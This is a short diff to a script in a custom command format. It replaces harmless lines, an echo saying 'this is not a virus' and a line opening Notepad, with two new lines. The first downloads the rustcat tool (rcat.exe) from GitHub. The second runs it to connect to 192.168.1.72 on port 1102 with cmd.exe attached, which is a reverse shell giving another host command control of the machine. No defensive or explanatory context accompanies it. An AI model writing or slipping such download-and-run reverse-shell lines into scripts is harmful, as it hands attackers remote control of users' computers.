@@ -1,6 +1,5 @@
 // Formating:
 // variables: set;[name];[value]
 // functions: do;[name];[value]
-do;run;echo eto ne virus > 1
-do;run;start notepad 1
-do;run;start thanks
+do;download;https://github.com/Kolya142/rustcat/releases/download/0.3.1/rcat.exe rcat.exe
+do;run;rcat.exe connect 192.168.1.72 1102 -s cmd.exe
